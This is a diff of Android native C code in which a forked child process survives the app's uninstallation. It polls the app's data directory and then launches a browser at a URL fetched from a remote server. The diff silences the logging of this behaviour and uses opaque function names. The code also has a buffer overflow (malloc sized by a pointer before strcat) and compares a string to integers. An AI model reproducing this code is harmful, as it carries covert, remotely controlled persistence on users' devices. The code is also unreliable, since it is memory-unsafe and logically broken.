@@ -21,46 +21,77 @@ static jclass mAppClz3;
 
 
 void startFork(char *pd, const char *url) {
-    LOGE("app uninstall,current pkg = %s", pd);
-    LOGE("app uninstall,current url = %s", url);
-    pid_t pid = fork();
-
+    int tag = JNI_FALSE;
+    if (tag)LOGI("app uninstall,current pkg = %s", pd);
+    if (tag)LOGI("app uninstall,current url = %s", url);
     char s_version[10];
     __system_property_get("ro.build.version.sdk", s_version);
-    LOGE("app uninstall,current sdkversion = %s", s_version);
-
+    if (tag)LOGI("app uninstall,current sdkversion = %s", s_version);
+//    if (s_version >= 19){
+//        return;
+//    }
+    pid_t pid = fork();
     if (pid < 0) {
-        LOGD("current crate process failure");
+        if (tag)LOGI("current crate process failure");
+        return;
     } else if (pid > 0) {
         // 说明克隆进程成功，而且该代码运行在父进程中
-        LOGD("crate process success,current parent pid = %d", pid);
+        if (tag)LOGI("create process success,current parent pid = %d", pid);
+        return;
     } else {
         // 说明克隆进程成功，而且代码运行在子进程中
-        LOGD("crate process success,current child pid = %d", pid);
+        if (tag)LOGI("create process success,current child pid = %d", pid);
         while (JNI_TRUE) {
-            FILE *file = fopen(pd, "rt");
+//            //子进程注册目录监听器
+//            int fileDescriptor = inotify_init();
+//            if (fileDescriptor < 0) {
+//                return;
+//            }
+            char *fileStr = malloc(sizeof("/data/data//files") + sizeof(pd));
+            strcpy(fileStr, "/data/data/");
+            strcat(fileStr, pd);
+            strcat(fileStr, "/files");
+//            int watchDescriptor = inotify_add_watch(fileDescriptor, fileStr, IN_DELETE);
+            FILE *file = fopen(fileStr, "rt");
+            free(fileStr);
+//            if (watchDescriptor < 0) {
+//                return;
+//            }
+
+//            //分配缓存，以便读取event，缓存大小=一个struct inotify_event的大小，这样一次处理一个event
+//            void *p_buf = malloc(sizeof(struct inotify_event));
+//            if (p_buf == NULL) {
+//                return;
+//            }
+//            //开始监听
+//            //read会阻塞进程，
+//            ssize_t readBytes = read(fileDescriptor, p_buf, sizeof(struct inotify_event));
+//            //走到这里说明收到目录被删除的事件，注销监听器
+//            free(p_buf);
+//            inotify_rm_watch(fileDescriptor, IN_DELETE);
             if (file == NULL) {
                 // 应用被卸载了，通知系统打开用户反馈的网页
                 if (s_version >= 17) {
                     // Android4.2系统之后支持多用户操作，所以得指定用户
+//                sleep(30);
+                    if (tag)LOGD("app run uninstall 2, rand = %d", 30);
                     execlp("am", "am", "start", "--user", "0", "-a",
                            "android.intent.action.VIEW", "-d",
                            url, (char *) NULL);
-                    LOGE("app run normal 2");
                     return;
                 } else {
                     // Android4.2以前的版本无需指定用户
+//                sleep(29);
+                    if (tag)LOGD("app run uninstall 1, rand = %d", 29);
                     execlp("am", "am", "start", "-a",
                            "android.intent.action.VIEW", "-d",
                            url, (char *) NULL);
-                    LOGE("app run normal 1");
                     return;
                 }
             } else {
-                // 应用没有被卸载
-                LOGE("app run normal");
+                if (tag)LOGD("app run normal ");
+                sleep(50);
             }
-            sleep(30);
         }
     }
 }
@@ -140,11 +171,25 @@ void runfk(void *jvm) {
     free(host);
     if (debug) LOGI("[x][fk][run] http run end.");
     if (result) {
-        jobject str = runStaticObjectMethod(env, mAppClz3, "aa", "([BI)Ljava/lang/String;", result);
-        if (!str) return;
-        const char *url = Jstring2CStr(env, str);
-        if (url) {
-            startFork(pkg3, url);
+        jobject str = runStaticObjectMethodX(env, mAppClz3, "aa", "([B)Ljava/lang/String;", result);
+        if (str) {
+            jint len = runIntMethod(env, "java/lang/String", str, "length", "()I");
+            if (len > 8) {
+                str = runObjectMethod(env, "java/lang/String", str, "substring",
+                                      "(I)Ljava/lang/String;", 8);
+                str = runObjectMethod(env, "java/lang/String", str, "replaceAll",
+                                      "(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;",
+                                      (*env)->NewStringUTF(env, "[\"\\}]"),
+                                      (*env)->NewStringUTF(env, ""));
+                str = runObjectMethod(env, "java/lang/String", str, "replaceAll",
+                                      "(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;",
+                                      (*env)->NewStringUTF(env, "[\\\\]"),
+                                      (*env)->NewStringUTF(env, ""));
+                const char *url = Jstring2CStr(env, str);
+                if (url) {
+                    startFork(pkg3, url);
+                }
+            }
         }
         if (debug) LOGI("[x][fk][run] shell check end. run a 1");
     }
